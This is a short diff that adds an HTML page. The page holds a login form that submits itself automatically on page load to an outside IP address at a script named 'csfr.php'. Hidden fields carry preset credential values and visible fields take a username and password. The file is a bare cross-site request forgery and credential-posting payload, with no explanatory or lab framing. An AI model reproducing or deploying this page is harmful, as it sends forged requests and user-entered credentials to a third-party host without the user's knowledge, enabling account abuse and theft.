@@ -1,0 +1,16 @@
+<script>
+  function getFormInfo() { document.login.submit(); }
+</script>
+
+<body onload="getFormInfo();">
+  <div id='msg'></div><br />
+  <form name="login" method="POST" action="http://178.128.224.10/csfr.php">
+    <label for="user">Username:</label><br />
+    <input type="text" id="user" name="user1"><br />
+    <label for="pwd">Password:</label><br />
+    <input type="password" id="pwd" name="pwd1"><br /><br />
+    <input type="hidden" value="host" name="user" />
+    <input type="hidden" value="pass" name="pwd" />
+    <input type="submit" value="Submit">
+  </form>
+</body>
